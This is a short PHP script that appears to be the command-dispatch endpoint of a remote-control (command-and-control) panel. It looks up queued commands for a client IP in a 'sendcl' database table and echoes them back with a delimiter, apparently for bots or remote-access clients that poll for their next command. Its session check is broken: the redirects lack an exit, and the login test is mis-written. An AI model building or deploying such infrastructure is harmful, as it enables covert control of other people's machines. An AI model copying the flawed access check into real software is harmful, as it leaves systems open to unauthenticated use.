<?php
session_start();
if (isset($_SESSION['login'])) {
    if (!$_SESSION['login'] == '1') {
        header('location: index.php');
    }
} else {
    header('location: index.php');
}
include('Information.php');
if (isset($_GET['i'])) {
    $ip = $_GET['i'];
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sql = "SELECT ID, ip, command FROM sendcl";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            if ($row['ip'] == $ip) {
                echo $row["ID"]."-..-".$row["command"].htmlspecialchars("<command>");
            }
        }
    } else {
        echo "NotFoundCommand";
    }
    $conn->close();
} else {
    echo 'err';
}
?>